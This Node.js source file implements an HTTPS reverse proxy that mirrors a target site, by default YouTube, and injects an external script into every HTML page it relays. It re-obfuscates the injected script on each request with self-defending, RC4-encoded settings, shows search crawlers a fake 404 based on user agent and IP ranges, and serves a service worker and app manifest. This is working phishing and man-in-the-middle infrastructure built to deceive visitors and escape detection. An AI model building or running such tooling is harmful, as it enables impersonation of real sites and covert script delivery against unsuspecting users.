const https = require('https');
const httpProxy = require('http-proxy');
const fs = require('fs');
const url = require('url');
const tlsOptions = require('./tls-config');
const JavaScriptObfuscator = require('javascript-obfuscator');

const INJECT_SCRIPT_PATH = '/inject.js';

// Domain fronting target backend domain, configurable via environment variable
const targetSite = process.env.TARGET_BACKEND_DOMAIN || 'https://www.youtube.com';

// Load original inject.js content
const originalInjectScript = fs.readFileSync('./inject.js', 'utf8');

// Obfuscate inject.js script dynamically for each request
function getObfuscatedInjectScript() {
  return JavaScriptObfuscator.obfuscate(originalInjectScript, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    debugProtection: false,
    debugProtectionInterval: false,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    log: false,
    renameGlobals: false,
    rotateStringArray: true,
    selfDefending: true,
    stringArray: true,
    stringArrayEncoding: ['rc4'],
    stringArrayThreshold: 0.75,
    unicodeEscapeSequence: false
  }).getObfuscatedCode();
}

// Create HTTPS proxy server
const proxy = httpProxy.createProxyServer({ target: targetSite, changeOrigin: true });

const server = https.createServer(tlsOptions, (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.connection.remoteAddress || req.socket.remoteAddress || '';

  // Bot and crawler filtering
  const botUserAgents = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
  ];

  // Simple IP blacklist (example, real list should be more comprehensive)
  const blacklistedIPs = [
    '66.249.', // Googlebot
    '207.46.', // Bingbot
    '157.55.', // Bingbot
    '40.77.',  // Bingbot
  ];

  const isBotUA = botUserAgents.some(bot => userAgent.includes(bot));
  const isBlacklistedIP = blacklistedIPs.some(ipPrefix => ip.startsWith(ipPrefix));

  if (isBotUA || isBlacklistedIP) {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>404 Not Found</h1><p>The page you requested was not found.</p>');
    return;
  }

  const parsedUrl = url.parse(req.url);

  // Serve the obfuscated injected JS script
  if (parsedUrl.pathname === INJECT_SCRIPT_PATH) {
    res.writeHead(200, {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache'
    });
    const obfuscatedScript = getObfuscatedInjectScript();
    res.end(obfuscatedScript);
    return;
  }

  // Serve PWA manifest
  if (parsedUrl.pathname === '/manifest.json') {
    const manifest = fs.readFileSync('./manifest.json', 'utf8');
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-cache'
    });
    res.end(manifest);
    return;
  }

  // Serve service worker
  if (parsedUrl.pathname === '/service-worker.js') {
    const sw = fs.readFileSync('./service-worker.js', 'utf8');
    res.writeHead(200, {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache'
    });
    res.end(sw);
    return;
  }

  // Proxy other requests to target site
  proxy.web(req, res);
});

// Intercept proxy response to inject JS into HTML
proxy.on('proxyRes', function (proxyRes, req, res) {
  let body = [];
  const contentType = proxyRes.headers['content-type'] || '';

  if (contentType.includes('text/html')) {
    proxyRes.on('data', function (chunk) {
      body.push(chunk);
    });
    proxyRes.on('end', function () {
      body = Buffer.concat(body).toString('utf8');
      const modifiedBody = injectScriptIntoHtml(body);
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      res.setHeader('content-length', Buffer.byteLength(modifiedBody));
      res.end(modifiedBody);
    });
  } else {
    proxyRes.pipe(res);
  }
});

// Function to inject the script tag into HTML body
function injectScriptIntoHtml(html) {
  const injection = `<script src="${INJECT_SCRIPT_PATH}"></script>`;
  if (html.includes('</body>')) {
    return html.replace('</body>', injection + '</body>');
  } else if (html.includes('</html>')) {
    return html.replace('</html>', injection + '</html>');
  } else {
    return html + injection;
  }
}

const PORT = 3333;
server.listen(PORT, () => {
  console.log(`Proxy server running on https://localhost:${PORT} proxying ${targetSite}`);
});
